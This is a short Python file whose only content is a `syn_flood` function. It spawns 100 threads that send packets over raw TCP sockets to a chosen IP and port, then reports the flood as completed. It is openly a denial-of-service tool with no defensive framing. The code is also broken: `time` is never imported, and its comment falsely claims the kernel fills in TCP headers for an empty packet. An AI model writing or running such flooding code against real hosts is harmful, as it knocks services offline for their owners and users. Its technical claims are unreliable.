import socket
import random
import threading

def syn_flood(target_ip: str, target_port: int, duration: int = 5):
    """
    Sends raw TCP SYN packets for the specified duration.
    Only works on Linux (requires raw socket permission).
    """

    def attack():
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
        except PermissionError:
            print("[!] Root permissions needed for raw socket.")
            return

        packet = b''  # We send empty packets; the kernel will auto-fill headers.

        end_time = time.time() + duration
        while time.time() < end_time:
            try:
                sock.sendto(packet, (target_ip, target_port))
            except:
                pass

    # Çoklu thread ile yük oluştur
    threads = []
    for _ in range(100):
        t = threading.Thread(target=attack)
        t.start()
        threads.append(t)

    for t in threads:
        t.join()

    return {
        "status": "SYN flood completed",
        "target": f"{target_ip}:{target_port}",
        "duration_seconds": duration,
    }
